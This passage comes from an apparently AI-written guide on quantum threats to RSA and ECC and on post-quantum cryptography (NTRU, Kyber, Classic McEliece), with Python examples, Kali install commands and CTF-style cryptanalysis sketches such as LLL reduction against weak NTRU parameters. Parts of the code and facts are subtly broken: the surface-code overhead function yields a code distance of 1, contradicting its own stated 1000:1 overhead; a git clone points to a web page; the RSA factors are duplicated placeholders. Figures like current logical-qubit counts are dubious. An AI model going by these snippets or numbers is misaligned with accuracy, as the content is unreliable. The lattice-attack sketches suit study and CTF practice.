    ("Financial data", 10, "RSA", 2048),
    ("Government classified", 50, "ECC", 256),
    ("TLS session keys", 1, "AES", 256),
    ("Encrypted backups", 30, "RSA", 4096),
]

print("\nQuantum Threat Assessment by Use Case [Speculation]:")
print("=" * 80)
for scenario in scenarios:
    result = assess_quantum_threat(*scenario)
    print(f"\n{result['data_type']}:")
    print(f"  Current protection: {result['algorithm']}")
    print(f"  Secrecy required until: {result['secrecy_until']}")
    print(f"  Estimated quantum break: {result['estimated_break_year']}")
    print(f"  Harvest-now-decrypt-later risk: {result['vulnerable_to_harvest']}")
    print(f"**Recommendation:** {result['recommendation']}")
```

**Economic and Infrastructure Challenges**

[Inference] Practical barriers to cryptographically-relevant quantum computers:

Financial barriers:

- Current quantum computers: $10M-100M+ per system
- Dilution refrigerators (required for superconducting qubits): $500K-2M
- Specialized facilities with vibration isolation, EM shielding
- Ongoing operational costs: $1M+ per year
- Total program cost for crypto-breaking QC: $500M-5B estimated [Speculation]

Technical challenges:

- Error correction overhead (1000:1 ratio physical:logical qubits)
- Qubit connectivity (limited interactions between distant qubits)
- Decoherence (quantum states collapse from environmental noise)
- Gate fidelity (current: 99.9%, needed: 99.99%+)
- Scalability (engineering challenge to reach millions of qubits)
- Algorithm efficiency (Shor's requires many iterations)

Infrastructure requirements:

- Cryogenic systems (<20mK for superconducting qubits)
- Ultra-high vacuum systems (for trapped ions)
- Precise laser systems (for ion/neutral atom platforms)
- Classical control systems (FPGAs, high-speed DACs)
- Skilled workforce (quantum physicists, engineers)

**Alternative Quantum Approaches**

```python
# Comparison of quantum computing platforms

quantum_platforms = {
    "Superconducting Qubits": {
        "leaders": ["IBM", "Google", "Rigetti"],
        "current_qubits": "100-1000 physical",
        "coherence_time": "50-200 microseconds",
        "gate_fidelity": "99.9%",
        "advantages": ["Fast gates (ns)", "Strong industry backing"],
        "disadvantages": ["Requires millikelvin temperatures", "Limited connectivity"],
        "crypto_timeline": "2035-2045 [Speculation]"
    },
    "Trapped Ions": {
        "leaders": ["IonQ", "Honeywell/Quantinuum", "Alpine Quantum"],
        "current_qubits": "30-50 physical",
        "coherence_time": "Minutes to hours",
        "gate_fidelity": "99.9%+",
        "advantages": ["High fidelity", "Long coherence", "All-to-all connectivity"],
        "disadvantages": ["Slower gates (microseconds)", "Scaling challenges"],
        "crypto_timeline": "2040-2050 [Speculation]"
    },
    "Neutral Atoms": {
        "leaders": ["Atom Computing", "QuEra", "Pasqal"],
        "current_qubits": "100-1000 physical",
        "coherence_time": "Seconds",
        "gate_fidelity": "99.5-99.9%",
        "advantages": ["Scalable arrays", "Room temperature optics"],
        "disadvantages": ["Complex control", "Lower gate fidelity"],
        "crypto_timeline": "2040-2050 [Speculation]"
    },
    "Topological/Anyons": {
        "leaders": ["Microsoft", "PsiQuantum"],
        "current_qubits": "0 (research phase)",
        "coherence_time": "Theoretically very long",
        "gate_fidelity": "Potentially intrinsic protection",
        "advantages": ["Built-in error correction", "Stable qubits"],
        "disadvantages": ["Not yet demonstrated", "Requires exotic materials"],
        "crypto_timeline": "2050+ [Speculation]"
    },
    "Photonic": {
        "leaders": ["PsiQuantum", "Xanadu"],
        "current_qubits": "Few to hundreds",
        "coherence_time": "Limited by photon loss",
        "gate_fidelity": "Variable",
        "advantages": ["Room temperature", "Networking potential"],
        "disadvantages": ["Probabilistic gates", "Photon loss"],
        "crypto_timeline": "Unknown [Speculation]"
    }
}

def print_platform_comparison():
    """Compare quantum computing platforms"""
    print("\nQuantum Computing Platform Comparison:")
    print("=" * 80)
    
    for platform, details in quantum_platforms.items():
        print(f"\n{platform}:")
        print(f"  Leaders: {', '.join(details['leaders'])}")
        print(f"  Current scale: {details['current_qubits']}")
        print(f"  Coherence: {details['coherence_time']}")
        print(f"  Gate fidelity: {details['gate_fidelity']}")
        print(f"  Cryptographic threat timeline: {details['crypto_timeline']}")

print_platform_comparison()
````

**Quantum Error Correction Overhead**

```python
def surface_code_overhead(logical_qubits, target_error_rate):
    """
    Calculate physical qubit requirements for surface code error correction
    [Unverified] Simplified model - actual requirements vary by implementation
    """
    # Physical error rate assumption
    physical_error_rate = 1e-3  # 0.1% (current state-of-art)
    
    # Code distance needed to reach target logical error rate
    # Rough approximation: d^3 * p < target_rate
    import math
    code_distance = math.ceil((target_error_rate / physical_error_rate) ** (1/3))
    
    # Surface code requires ~2*d^2 physical qubits per logical qubit
    physical_per_logical = 2 * code_distance ** 2
    
    total_physical = logical_qubits * physical_per_logical
    
    return {
        'logical_qubits': logical_qubits,
        'code_distance': code_distance,
        'physical_per_logical': physical_per_logical,
        'total_physical_qubits': total_physical,
        'overhead_ratio': physical_per_logical
    }

# RSA-2048 factorization requirements
rsa2048_logical = 4096  # Approximate logical qubits needed
target_error = 1e-10    # Target logical error rate

overhead = surface_code_overhead(rsa2048_logical, target_error)

print("\nQuantum Error Correction Overhead for RSA-2048:")
print(f"  Logical qubits needed: {overhead['logical_qubits']:,}")
print(f"  Code distance: {overhead['code_distance']}")
print(f"  Physical qubits per logical: {overhead['physical_per_logical']:,}")
print(f"  Total physical qubits: {overhead['total_physical_qubits']:,}")
print(f"  Overhead ratio: {overhead['overhead_ratio']}:1")

# Scaling analysis
print("\n\nPhysical Qubit Requirements for Different Algorithms:")
print("=" * 70)
for algo, logical in [("RSA-1024", 2048), ("RSA-2048", 4096), 
                       ("RSA-4096", 8192), ("AES-128 (Grover)", 228)]:
    result = surface_code_overhead(logical, 1e-10)
    print(f"{algo:20} {result['total_physical_qubits']:>15,} physical qubits")
```

**Intelligence Community Perspectives**

```
[Unverified] Public statements from intelligence/security agencies:

NSA (National Security Agency):
- 2015: "We must act now" - quantum threat is real
- 2022: Released CNSA 2.0 suite requiring post-quantum transition
- Timeline: Begin migration immediately, complete by 2035

NIST (National Institute of Standards and Technology):
- 2016: Started post-quantum cryptography standardization project
- 2024: Published first PQC standards (FIPS 203, 204, 205)
- Recommendation: Migrate to PQC before quantum computers arrive

GCHQ/NCSC (UK):
- 2016: White paper on quantum key distribution limitations
- Recommendation: Focus on PQC algorithms, not QKD

European Telecommunications Standards Institute (ETSI):
- Quantum-safe cryptography working group established 2013
- Focus on migration strategies and hybrid approaches

Chinese Academy of Sciences:
- Major investments in quantum computing and communications
- Focus on quantum key distribution networks
- Timeline claims: Practical quantum computer by 2030 [Unverified]
```

**Migration Strategies**

```python
def post_quantum_migration_strategy(system_type, current_crypto):
    """
    Recommend migration approach based on system characteristics
    """
    strategies = {
        "TLS/Web": {
            "approach": "Hybrid classical + post-quantum",
            "algorithms": {
                "key_exchange": "X25519 + ML-KEM-768",
                "signatures": "RSA-2048/ECDSA + ML-DSA-65",
                "reasoning": "Backward compatibility required"
            },
            "timeline": "Start 2024-2025, complete by 2030",
            "tools": ["OpenSSL 3.x", "BoringSSL with PQC", "wolfSSL"]
        },
        "VPN": {
            "approach": "Hybrid or pure post-quantum",
            "algorithms": {
                "key_exchange": "ML-KEM-1024",
                "authentication": "ML-DSA-87",
                "symmetric": "AES-256-GCM"
            },
            "timeline": "Start 2025, complete by 2028",
            "tools": ["strongSwan PQC", "WireGuard-PQ"]
        },
        "Code Signing": {
            "approach": "Pure post-quantum (long-lived signatures)",
            "algorithms": {
                "signatures": "SLH-DSA-SHA2-256s or ML-DSA-87",
                "hash": "SHA-512",
                "reasoning": "Signatures must remain valid 20+ years"
            },
            "timeline": "Immediate migration",
            "tools": ["sigstore with PQC", "Custom HSM integration"]
        },
        "Encrypted Storage": {
            "approach": "Symmetric crypto upgrade + PQ key wrapping",
            "algorithms": {
                "encryption": "AES-256-GCM or ChaCha20-Poly1305",
                "key_wrapping": "ML-KEM-1024",
                "hash": "SHA-512"
            },
            "timeline": "Start 2025, complete by 2030",
            "tools": ["dm-crypt with PQC", "LUKS2 PQC support"]
        },
        "Embedded/IoT": {
            "approach": "Lightweight PQC algorithms",
            "algorithms": {
                "signatures": "SLH-DSA-SHAKE-128s (small)",
                "key_exchange": "ML-KEM-512 (if constrained)",
                "symmetric": "AES-128-GCM"
            },
            "timeline": "Design new systems with PQC, retrofit by 2035",
            "tools": ["liboqs-embedded", "PQClean"]
        }
    }
    
    return strategies.get(system_type, {
        "approach": "Evaluate based on threat model",
        "algorithms": "Consult NIST PQC standards",
        "timeline": "Assess data longevity requirements",
        "tools": "See https://csrc.nist.gov/projects/post-quantum-cryptography"
    })

# Example migration plans
print("\nPost-Quantum Migration Strategies:")
print("=" * 80)

for system in ["TLS/Web", "VPN", "Code Signing", "Encrypted Storage"]:
    strategy = post_quantum_migration_strategy(system, None)
    print(f"\n{system}:")
    print(f"  Approach: {strategy['approach']}")
    print(f"  Algorithms:")
    for key, value in strategy.get('algorithms', {}).items():
        print(f"    - {key}: {value}")
    print(f"  Timeline: {strategy['timeline']}")
```

**Hybrid Cryptography Approach**

```python
# Example: Hybrid key exchange (classical + post-quantum)

def hybrid_key_exchange_example():
    """
    Demonstrate hybrid key exchange combining classical and PQC
    Uses both X25519 (classical ECDH) and ML-KEM (post-quantum)
    """
    from cryptography.hazmat.primitives.asymmetric import x25519
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.hkdf import HKDF
    import os
    
    # Classical component: X25519
    classical_private = x25519.X25519PrivateKey.generate()
    classical_public = classical_private.public_key()
    
    # Post-quantum component: ML-KEM (simulated - not in standard library yet)
    # In practice, use liboqs-python or similar
    pq_shared_secret = os.urandom(32)  # Placeholder
    
    # Peer's public keys (received from other party)
    peer_classical_public = x25519.X25519PrivateKey.generate().public_key()
    
    # Derive classical shared secret
    classical_shared = classical_private.exchange(peer_classical_public)
    
    # Combine both shared secrets
    combined_secret = classical_shared + pq_shared_secret
    
    # Derive final key material
    kdf = HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=None,
        info=b'hybrid-key-exchange'
    )
    final_key = kdf.derive(combined_secret)
    
    return final_key

# Hybrid signature verification
def hybrid_signature_verify(message, classical_sig, pq_sig, classical_pubkey, pq_pubkey):
    """
    Verify both classical and post-quantum signatures
    Both must be valid for acceptance
    """
    classical_valid = verify_ecdsa(message, classical_sig, classical_pubkey)
    pq_valid = verify_dilithium(message, pq_sig, pq_pubkey)
    
    # Conservative approach: Require BOTH to be valid
    return classical_valid and pq_valid

print("\nHybrid Cryptography Benefits:")
print("  - Protection against quantum attacks (PQC component)")
print("  - Protection if PQC algorithms broken (classical component)")
print("  - Gradual transition path")
print("  - Backward compatibility in many scenarios")
```

**CTF Challenges Related to Quantum Threats**

```python
# CTF challenges typically simulate quantum threats rather than use real quantum computers

def ctf_quantum_simulation_challenge():
    """
    Example CTF challenge: "Harvest Now, Decrypt Later" scenario
    
    Challenge description:
    "We intercepted encrypted traffic from 2015 that used RSA-2048.
    Our quantum computer can now factor the RSA modulus.
    The quantum computer output gave us these factors.
    Decrypt the message to get the flag."
    """
    # Provided: RSA ciphertext and factors from "quantum factorization"
    n = 25195908475657893494027183240048398571429282126204032027777137836043662020707595556264018525880784406918290641249515082189298559149176184502808489120072844992687392807287776735971418347270261896375014971824691165077613379859095700097330459748808428401797429100642458691817195118746121515172654632282216869987  # Example RSA-2048 modulus
    
    # "Quantum computer" provides factors (in CTF, just given to you)
    p = 158794449493...  # Factor 1
    q = 158794449493...  # Factor 2
    
    # Now decrypt using standard RSA math
    # This simulates the post-quantum threat
    
    e = 65537
    c = 12345...  # Ciphertext
    
    # Calculate private exponent
    phi = (p - 1) * (q - 1)
    d = pow(e, -1, phi)
    
    # Decrypt
    m = pow(c, d, n)
    flag = m.to_bytes((m.bit_length() + 7) // 8, 'big')
    
    return flag

# Another CTF scenario: Grover's algorithm simulation
def ctf_grover_simulation():
    """
    Challenge: "Our quantum computer used Grover's algorithm to
    find the AES-128 key in 2^64 operations instead of 2^128.
    We've narrowed it down to these 1000 candidates.
    Find the correct key."
    """
    # Challenge provides reduced keyspace (simulating Grover's speedup)
    candidates = [...]  # 1000 possible keys instead of 2^128
    
    ciphertext = b"..."
    known_plaintext = b"FLAG{"
    
    # Brute force the reduced keyspace
    for key_candidate in candidates:
        plaintext = aes_decrypt(ciphertext, key_candidate)
        if plaintext.startswith(known_plaintext):
            return plaintext
    
    return None

print("\nCommon CTF Quantum Cryptography Challenge Types:")
print("  1. RSA factorization with given factors (simulate Shor's)")
print("  2. Reduced keyspace search (simulate Grover's)")
print("  3. Post-quantum algorithm analysis (implementation bugs)")
print("  4. Hybrid protocol attacks (classical/PQC interaction)")
print("  5. Side-channel attacks on PQC implementations")
```

**Post-Quantum Cryptography Standards (NIST)**

```python
# NIST PQC standardized algorithms (2024)

nist_pqc_standards = {
    "ML-KEM (Kyber)": {
        "type": "Key Encapsulation Mechanism",
        "security_levels": {
            "ML-KEM-512": "AES-128 equivalent",
            "ML-KEM-768": "AES-192 equivalent",
            "ML-KEM-1024": "AES-256 equivalent"
        },
        "key_sizes": {
            "ML-KEM-768": {
                "public_key": "1184 bytes",
                "ciphertext": "1088 bytes",
                "shared_secret": "32 bytes"
            }
        },
        "use_cases": ["TLS key exchange", "VPN", "Encrypted messaging"],
        "standard": "FIPS 203",
        "base": "Module-LWE (Learning With Errors)"
    },
    "ML-DSA (Dilithium)": {
        "type": "Digital Signature",
        "security_levels": {
            "ML-DSA-44": "~128-bit security",
            "ML-DSA-65": "~192-bit security",
            "ML-DSA-87": "~256-bit security"
        },
        "signature_sizes": {
            "ML-DSA-65": {
                "public_key": "1952 bytes",
                "signature": "3293 bytes"
            }
        },
        "use_cases": ["Code signing", "Certificate signatures", "Authentication"],
        "standard": "FIPS 204",
        "base": "Module-LWE with Fiat-Shamir"
    },
    "SLH-DSA (SPHINCS+)": {
        "type": "Stateless Hash-Based Signature",
        "security_levels": {
            "SLH-DSA-SHA2-128s": "128-bit security (small)",
            "SLH-DSA-SHA2-192s": "192-bit security (small)",
            "SLH-DSA-SHA2-256s": "256-bit security (small)"
        },
        "signature_sizes": {
            "SLH-DSA-SHA2-128s": {
                "public_key": "32 bytes",
                "signature": "7856 bytes"
            }
        },
        "use_cases": ["Long-term signatures", "Firmware signing", "Backup signatures"],
        "standard": "FIPS 205",
        "base": "Hash functions only (conservative approach)"
    },
    "FN-DSA (FALCON)": {
        "type": "Digital Signature (Compact)",
        "security_levels": {
            "FALCON-512": "~128-bit security",
            "FALCON-1024": "~256-bit security"
        },
        "signature_sizes": {
            "FALCON-512": {
                "public_key": "897 bytes",
                "signature": "666 bytes"
            }
        },
        "use_cases": ["Constrained environments", "Certificates", "Embedded systems"],
        "standard": "Additional NIST standard (2024)",
        "base": "NTRU lattices with Fast Fourier sampling"
    }
}

def compare_pqc_algorithms():
    """Compare post-quantum cryptography algorithms"""
    print("\nNIST Post-Quantum Cryptography Standards (2024):")
    print("=" * 80)
    
    for algo_name, details in nist_pqc_standards.items():
        print(f"\n{algo_name}:")
        print(f"  Type: {details['type']}")
        print(f"  Standard: {details['standard']}")
        print(f"  Based on: {details['base']}")
        print(f"  Use cases: {', '.join(details['use_cases'])}")
        
        if 'signature_sizes' in details:
            for variant, sizes in details['signature_sizes'].items():
                print(f"  {variant} sizes:")
                for key, value in sizes.items():
                    print(f"    - {key}: {value}")

compare_pqc_algorithms()
```

**Quantum-Resistant vs Quantum-Vulnerable Summary**

```python
def cryptographic_algorithm_status():
    """
    Summary of cryptographic algorithms and quantum resistance
    """
    status_table = {
        "Public Key Cryptography": {
            "RSA (all sizes)": {
                "quantum_vulnerable": True,
                "threat": "Shor's algorithm",
                "replacement": "ML-DSA or SLH-DSA"
            },
            "DSA/ECDSA": {
                "quantum_vulnerable": True,
                "threat": "Shor's algorithm",
                "replacement": "ML-DSA or SLH-DSA"
            },
            "Diffie-Hellman/ECDH": {
                "quantum_vulnerable": True,
                "threat": "Shor's algorithm",
                "replacement": "ML-KEM"
            },
            "ElGamal": {
                "quantum_vulnerable": True,
                "threat": "Shor's algorithm",
                "replacement": "ML-KEM"
            }
        },
        "Symmetric Cryptography": {
            "AES-128": {
                "quantum_vulnerable": "Weakened (64-bit quantum security)",
                "threat": "Grover's algorithm",
                "replacement": "AES-256"
            },
            "AES-256": {
                "quantum_vulnerable": False,
                "threat": "Grover's algorithm (128-bit quantum security remains secure)",
                "replacement": "No replacement needed"
            },
            "ChaCha20": {
                "quantum_vulnerable": False,
                "threat": "Grover's algorithm (128-bit quantum security)",
                "replacement": "No replacement needed"
            },
            "3DES": {
                "quantum_vulnerable": True,
                "threat": "Grover's algorithm (56-bit quantum security)",
                "replacement": "AES-256"
            }
        },
        "Hash Functions": {
            "SHA-256": {
                "quantum_vulnerable": "Collision resistance weakened to 128-bit",
                "threat": "Grover's algorithm",
                "replacement": "SHA-512 for higher security, SHA-256 acceptable for most uses"
            },
            "SHA-512": {
                "quantum_vulnerable": False,
                "threat": "Grover's algorithm (256-bit collision resistance)",
                "replacement": "No replacement needed"
            },
            "SHA-3": {
                "quantum_vulnerable": "Similar to SHA-2",
                "threat": "Grover's algorithm",
                "replacement": "SHA-3-512 for highest security"
            }
        }
    }
    
    print("\nCryptographic Algorithm Quantum Resistance Status:")
    print("=" * 80)
    
    for category, algorithms in status_table.items():
        print(f"\n{category}:")
        for algo, status in algorithms.items():
            vuln_status = "❌ VULNERABLE" if status['quantum_vulnerable'] == True else \
                         "⚠️  WEAKENED" if isinstance(status['quantum_vulnerable'], str) else \
                         "✅ SECURE"
            print(f"  {algo}: {vuln_status}")
            print(f"    Threat: {status['threat']}")
            print(f"    Recommendation: {status['replacement']}")

cryptographic_algorithm_status()
```

**Key Takeaways**

```
Summary of Quantum Cryptographic Threats:

1. SHOR'S ALGORITHM (Critical Threat):
   - Breaks: RSA, DSA, ECDSA, Diffie-Hellman, ECDH, ElGamal
   - Timeline: 2030-2045 [Speculation with high uncertainty]
   - Impact: Complete compromise of public-key cryptography
   - Mitigation: Migrate to NIST PQC standards (ML-KEM, ML-DSA, SLH-DSA)
   - Urgency: HIGH - "Harvest now, decrypt later" attacks already possible

2. GROVER'S ALGORITHM (Moderate Threat):
   - Weakens: Symmetric crypto and hash functions (quadratic speedup)
   - Timeline: 2050+ [Highly speculative]
   - Impact: AES-128 → 64-bit security, SHA-256 collisions → 128-bit
   - Mitigation: Use AES-256, SHA-512 for long-term security
   - Urgency: LOW - Doubling key sizes provides adequate protection

3. PRACTICAL CONSIDERATIONS:
   - Quantum computers capable of breaking RSA-2048 need ~4,000-20,000 logical qubits
   - Current technology: ~70-100 logical qubits (2024-2025)
   - Error correction requires ~1,000-10,000 physical qubits per logical qubit
   - Total requirement: 4-200 million physical qubits [Inference]
   - Engineering challenges remain substantial

4. MIGRATION STRATEGY:
   - Start NOW: Begin post-quantum migration (NIST recommendations)
   - Hybrid approach: Combine classical + PQC during transition
   - Priority: Systems with long data lifetimes (>10 years)
   - Timeline: Complete migration by 2030-2035 (government mandate)
   
5. CTF RELEVANCE:
   - Challenges simulate quantum attacks (provide factors, reduced keyspaces)
   - Focus on understanding PQC algorithms and their vulnerabilities
   - Side-channel attacks on PQC implementations
   - Protocol analysis of hybrid classical/PQC systems
```

**Important Related Topics:**

- Lattice-based cryptography fundamentals (basis for ML-KEM and ML-DSA)
- Hash-based signatures (XMSS, LMS) for stateful applications
- Code-based cryptography (Classic McEliece)
- Quantum Key Distribution (QKD) limitations and practicality
- Side-channel attacks on post-quantum implementations
- Hybrid certificate chains and PKI transition strategies

---

## Post-Quantum Cryptography

### Lattice-based (NTRU, Kyber)

Lattice-based cryptography relies on the hardness of mathematical problems in high-dimensional lattices, specifically the Shortest Vector Problem (SVP) and Closest Vector Problem (CVP). These problems are believed to be resistant to both classical and quantum attacks.

**Mathematical Foundation:**

A lattice is a discrete subgroup of ℝⁿ generated by basis vectors. Given basis vectors b₁, b₂, ..., bₙ:

```
L(b₁, b₂, ..., bₙ) = {∑(aᵢ * bᵢ) : aᵢ ∈ ℤ}
```

**Hard Problems:**

- **SVP (Shortest Vector Problem)**: Find the shortest non-zero vector in a lattice
- **CVP (Closest Vector Problem)**: Given a target point, find the closest lattice point
- **LWE (Learning With Errors)**: Distinguish between noisy linear equations and random data
- **Ring-LWE**: LWE variant using polynomial rings for efficiency

**NTRU (N-th Degree Truncated Polynomial Ring)**

NTRU is one of the earliest lattice-based cryptosystems, introduced in 1996. It operates on truncated polynomial rings.

**Parameters:**

- N: polynomial degree (prime)
- p, q: small and large moduli (typically p=3, q is a power of 2)
- Polynomial ring: R = ℤ[x]/(xᴺ - 1)

**Key Generation:**

```python
# Conceptual NTRU key generation (not production code)
import numpy as np

def ntru_keygen(N, p, q):
    # Generate small random polynomials f, g
    # f must be invertible mod p and mod q
    f = generate_small_polynomial(N)
    g = generate_small_polynomial(N)
    
    # Compute inverses
    f_p = invert_poly(f, p)  # f inverse mod p
    f_q = invert_poly(f, q)  # f inverse mod q
    
    # Public key: h = f_q * g (mod q)
    h = poly_mult(f_q, g, q)
    
    # Private key: (f, f_p)
    return (h, (f, f_p))
```

**Encryption:**

```python
def ntru_encrypt(message, public_key_h, N, p, q):
    # Random blinding polynomial
    r = generate_small_polynomial(N)
    
    # Ciphertext: e = r*h + m (mod q)
    e = (poly_mult(r, public_key_h, q) + message) % q
    return e
```

**Decryption:**

```python
def ntru_decrypt(ciphertext_e, private_key_f, private_key_fp, p, q):
    # a = f * e (mod q)
    a = poly_mult(private_key_f, ciphertext_e, q)
    
    # Reduce mod p: b = a (mod p)
    b = a % p
    
    # m = f_p * b (mod p)
    m = poly_mult(private_key_fp, b, p)
    return m
```

**NTRU in Kali Linux:**

[Unverified - NTRU implementations in Kali may be limited]

```bash
# Install NTRU library (if available)
git clone https://github.com/NTRUOpenSourceProject/ntru-crypto.git
cd ntru-crypto
make
make install

# Python NTRU implementation
pip3 install ntru
```

**Python NTRU Example:**

```python
from ntru import NTRU

# Initialize with parameter set
ntru = NTRU('ees1087ep2')  # One of the standardized parameter sets

# Generate keypair
public_key, private_key = ntru.generate_keypair()

# Encrypt message
message = b"Secret message"
ciphertext = ntru.encrypt(message, public_key)

# Decrypt
plaintext = ntru.decrypt(ciphertext, private_key)
```

**NTRU Security Considerations:**

[Inference based on cryptographic literature]

- Parameter selection critical: N=439, p=3, q=2048 provides ~128-bit security
- Vulnerable to lattice reduction attacks if parameters too small
- Decryption failures possible with wrong parameters (non-zero error probability)

**Kyber (CRYSTALS-Kyber)**

Kyber is a lattice-based Key Encapsulation Mechanism (KEM) selected by NIST for post-quantum standardization in 2022. It is based on Module-LWE.

**NIST Standardization Status:** [As of January 2025 knowledge cutoff] Kyber was selected as the primary KEM algorithm for NIST's post-quantum standard, with the standardized name "ML-KEM" (Module-Lattice-based KEM).

**Parameter Sets:**

- **Kyber512**: ~128-bit security (NIST Level 1)
- **Kyber768**: ~192-bit security (NIST Level 3)
- **Kyber1024**: ~256-bit security (NIST Level 5)

**Key Encapsulation Mechanism:**

```
KeyGen() → (pk, sk)
Encaps(pk) → (ct, ss)    # ct = ciphertext, ss = shared secret
Decaps(sk, ct) → ss
```

**Kyber Implementation in Kali:**

```bash
# Install liboqs (Open Quantum Safe library)
sudo apt update
sudo apt install liboqs-dev

# Or build from source
git clone https://github.com/open-quantum-safe/liboqs.git
cd liboqs
mkdir build && cd build
cmake -GNinja -DCMAKE_INSTALL_PREFIX=/usr/local ..
ninja
sudo ninja install
```

**Using Kyber with OpenSSL (oqs-provider):**

```bash
# Install oqs-provider for OpenSSL
git clone https://github.com/open-quantum-safe/oqs-provider.git
cd oqs-provider
cmake -S . -B _build -DCMAKE_INSTALL_PREFIX=/usr/local
cmake --build _build
sudo cmake --install _build

# Generate Kyber keypair
openssl genpkey -algorithm kyber768 -out kyber_private.pem

# Extract public key
openssl pkey -in kyber_private.pem -pubout -out kyber_public.pem
```

**Python Kyber Implementation:**

```bash
# Install pqcrypto library
pip3 install pqcrypto
```

```python
from pqcrypto.kem.kyber768 import generate_keypair, encrypt, decrypt

# Generate keypair
public_key, secret_key = generate_keypair()

# Encapsulation: generates shared secret and ciphertext
ciphertext, shared_secret_sender = encrypt(public_key)

# Decapsulation: recovers shared secret
shared_secret_receiver = decrypt(secret_key, ciphertext)

# Both parties now have same shared secret
assert shared_secret_sender == shared_secret_receiver

# Use shared secret for symmetric encryption
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# Derive AES key from shared secret
aes_key = shared_secret_sender[:32]
cipher = AES.new(aes_key, AES.MODE_GCM)
```

**Kyber Structure:**

```
Public Key: (A, t = As + e)
Secret Key: s
Ciphertext: (u, v) where:
  u = A^T r + e1
  v = t^T r + e2 + encode(message)
```

All operations are in polynomial rings modulo q.

**Lattice Attack Concepts:**

**LLL Algorithm (Lenstra-Lenstra-Lovász):**

Polynomial-time lattice basis reduction algorithm, but doesn't solve SVP optimally:

```bash
# Using fpylll for lattice reduction
pip3 install fpylll

# Python example
from fpylll import IntegerMatrix, LLL

# Create lattice basis matrix
A = IntegerMatrix.random(50, "qary", k=25, q=1048583)

# Perform LLL reduction
A = LLL.reduction(A)

# First vector is shorter than original basis
print("Shortest vector found:", A[0])
```

**BKZ Algorithm (Block Korkine-Zolotarev):**

Stronger reduction algorithm used in cryptanalysis:

```python
from fpylll import BKZ

# BKZ reduction with block size
param = BKZ.Param(block_size=20)
BKZ.reduction(A, param)
```

[Inference - computational complexity] BKZ with large block sizes can break weak lattice parameters, but computational cost grows exponentially. Block size 20-30 feasible; 100+ currently infeasible.

**Lattice-based CTF Challenges:**

**Weak Parameter Detection:**

```python
# Analyze NTRU parameters for security
def estimate_ntru_security(N, q):
    # Rough estimate using lattice dimension
    log_security = N * np.log2(q) / 2
    return log_security

# Example: Check if parameters are weak
N = 251  # Small N
q = 128  # Small q
sec = estimate_ntru_security(N, q)
if sec < 80:
    print(f"Weak parameters: ~{sec:.1f} bits of security")
```

**Tools for Lattice Cryptanalysis:**

- `fpylll` - Python lattice reduction library
- `FPLLL` - C++ lattice reduction
- `SageMath` - Comprehensive math system with lattice support
- `Sage Crypto` - Cryptographic functions including lattice attacks

**SageMath Lattice Analysis:**

```bash
# Install SageMath in Kali
sudo apt install sagemath

# Launch Sage
sage
```

```python
# Sage example: Lattice reduction attack
from sage.all import *

# Create lattice from NTRU-like problem
N = 251
q = 128
h = [...]  # Public key polynomial coefficients

# Build lattice basis matrix
M = Matrix(ZZ, 2*N, 2*N)
for i in range(N):
    M[i, i] = q
    M[i+N, i] = h[i]
    M[i+N, i+N] = 1

# LLL reduction
M_reduced = M.LLL()

# Short vectors may reveal private key
print(M_reduced[0])
```

**Key Sizes:**

|Algorithm|Public Key|Private Key|Ciphertext|
|---|---|---|---|
|NTRU (ees1087ep2)|1495 bytes|1590 bytes|1495 bytes|
|Kyber512|800 bytes|1632 bytes|768 bytes|
|Kyber768|1184 bytes|2400 bytes|1088 bytes|
|Kyber1024|1568 bytes|3168 bytes|1568 bytes|

**Performance Comparison:**

[Inference based on published benchmarks - actual performance hardware-dependent]

```
Kyber768 operations (approximate):
- Key Generation: 50,000 ops/sec
- Encapsulation: 70,000 ops/sec
- Decapsulation: 50,000 ops/sec

NTRU operations:
- Key Generation: 5,000 ops/sec
- Encryption: 50,000 ops/sec
- Decryption: 40,000 ops/sec
```

Kyber is significantly faster and has smaller key sizes than traditional NTRU implementations.

---

### Code-based (McEliece)

Code-based cryptography relies on the hardness of decoding random linear codes. The McEliece cryptosystem, introduced in 1978, is one of the oldest post-quantum schemes and has withstood cryptanalysis for over 45 years.

**Mathematical Foundation:**

Based on error-correcting codes, specifically Goppa codes. The hard problem is:

- **Syndrome Decoding Problem**: Given a linear code and a syndrome, find a low-weight error vector

**McEliece Cryptosystem Structure:**

**Key Generation:**

```
1. Choose a binary [n, k, t] Goppa code G' with efficient decoding
   - n: code length
   - k: code dimension
   - t: error correction capability

2. Generate:
   - G': k × n generator matrix for the Goppa code
   - S: k × k random invertible matrix (scrambler)
   - P: n × n random permutation matrix

3. Public key: Ĝ = S · G' · P (appears random)
4. Private key: (G', S, P, decoding algorithm)
```

**Encryption:**

```
Encrypt(m, Ĝ):
  1. Encode message: c' = m · Ĝ
  2. Add random error: c = c' + e
     where e is random vector of Hamming weight ≤ t
  Return ciphertext c
```

**Decryption:**

```
Decrypt(c, G', S, P):
  1. Compute: c'' = c · P⁻¹
  2. Decode using Goppa code: m' = Decode(c'', G')
  3. Retrieve message: m = m' · S⁻¹
  Return plaintext m
```

**Standard Parameters (Classic McEliece):**

NIST Round 4 finalist parameter sets:

```
mceliece348864:  n=3488, k=2720, t=64  (~128-bit security)
mceliece460896:  n=4608, k=3360, t=96  (~192-bit security)
mceliece6688128: n=6688, k=5024, t=128 (~256-bit security)
mceliece6960119: n=6960, k=5413, t=119 (~256-bit security)
mceliece8192128: n=8192, k=6528, t=128 (~256-bit security)
```

**Implementation in Kali Linux:**

```bash
# Using liboqs (Open Quantum Safe)
sudo apt install liboqs-dev

# Or install Classic McEliece reference implementation
git clone https://classic.mceliece.org/software.html
cd mceliece
make
```

**Python Implementation (pqcrypto):**

```bash
pip3 install pqcrypto
```

```python
from pqcrypto.kem.mceliece348864 import generate_keypair, encrypt, decrypt

# Generate keypair
public_key, secret_key = generate_keypair()

# Key encapsulation
ciphertext, shared_secret_sender = encrypt(public_key)

# Key decapsulation
shared_secret_receiver = decrypt(secret_key, ciphertext)

assert shared_secret_sender == shared_secret_receiver
```

**Using with OpenSSL (oqs-provider):**

```bash
# Generate Classic McEliece keypair
openssl genpkey -algorithm mceliece348864 -out mceliece_private.pem

# Extract public key
openssl pkey -in mceliece_private.pem -pubout -out mceliece_public.pem

# Key sizes
ls -lh mceliece_*.pem
# Public key: ~261 KB
# Private key: ~6.5 KB
```

**Key Size Challenge:**

McEliece's primary drawback is large public key sizes:

|Parameter Set|Public Key|Private Key|Ciphertext|
|---|---|---|---|
